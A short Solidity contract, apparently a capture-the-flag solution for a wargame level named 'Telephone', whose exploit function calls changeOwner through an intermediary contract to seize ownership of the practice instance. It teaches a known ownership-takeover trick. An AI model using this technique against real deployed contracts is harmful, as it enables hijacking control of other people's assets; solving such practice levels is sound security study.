// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/level04.sol";

contract AttackerTelephone  {
    function exploit(address instance) external {
        Telephone(instance).changeOwner(msg.sender);
    }
}
